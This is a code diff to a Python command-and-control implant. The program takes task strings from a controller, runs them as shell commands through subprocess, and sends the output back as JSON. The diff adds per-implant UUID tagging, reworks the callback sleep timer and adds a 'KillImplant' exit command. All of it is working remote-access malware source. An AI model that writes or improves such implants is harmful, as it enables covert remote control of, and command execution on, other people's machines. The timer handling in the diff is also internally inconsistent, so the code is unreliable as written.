@@ -5,7 +5,7 @@ import time
 import uuid
 import subprocess
 
-uuid = uuid.uuid4()
+uuid = str(uuid.uuid4())
 MsgNum = 0
 sleepytime = 0
 
@@ -16,22 +16,22 @@ def admin(todo, value=0):
     if (todo == "ChangeTimer"):
         result = "Time Changed to " + str(value) + " hours"
     elif (todo == "ViewTimer"):
-        result = "Current callback time is " + str(sleepytime/60) + " hours"
+        result = "Current callback time is " + str(sleepytime * 60) + " hours"
     return result
 
 
-def tojson(uuid, data):
-    uuid = uuid + 1
-    json_to_load = {"id": uuid, "name": "test",
-        "Type": "response", "data": data}
+def tojson(idnum, data):
+    idnum = idnum + 1
+    json_to_load = {"id": idnum, "name": uuid, "Type": "response", "data": data}
     NewMsg = json.dumps(json_to_load)
     return NewMsg
 
 
 def GenMsg(x):
     if (x == 0):
-        NewMsgJ = '{"id": 0, "name": "test", "Type": "init"}'
-        NewMsg = str.encode(NewMsgJ)
+        NewMsgJ = {"id": 0, "name": uuid, "Type": "init"}
+        NewMsgD = json.dumps(NewMsgJ)
+        NewMsg = str.encode(NewMsgD)
     else:
         reformat = x.split(" ")
         output = subprocess.Popen(
@@ -58,17 +58,20 @@ while True:
         if (receive["task"] == "admin_tasker"):
             if ("value" in receive):
                 MsgDraft = admin(receive["Type"], receive["value"])
-                sleepytime = receive["value"]
-            elif (receive["task"] == "admin_sleep"):
-                sleepy(receive["value"])
+                sleepytime = receive["value"] * 60
             else:
                 MsgDraft = admin(receive["Type"])
             MsgJson = tojson(receive["id"], MsgDraft)
             Msg = str.encode(MsgJson)
-        elif (receive["task"] != "quit"):
+        elif (receive["task"] == "admin_sleep"):
+            time.sleep(sleepytime)
+        elif (receive["task"] != "KillImplant"):
             MsgDraft = GenMsg(receive["task"])
             MsgJson = tojson(receive["id"], MsgDraft)
             Msg = str.encode(MsgJson)
+        elif (receive["task"] == "KillImplant"):
+            print("closing...")
+            exit()
         else:
             exit()
 
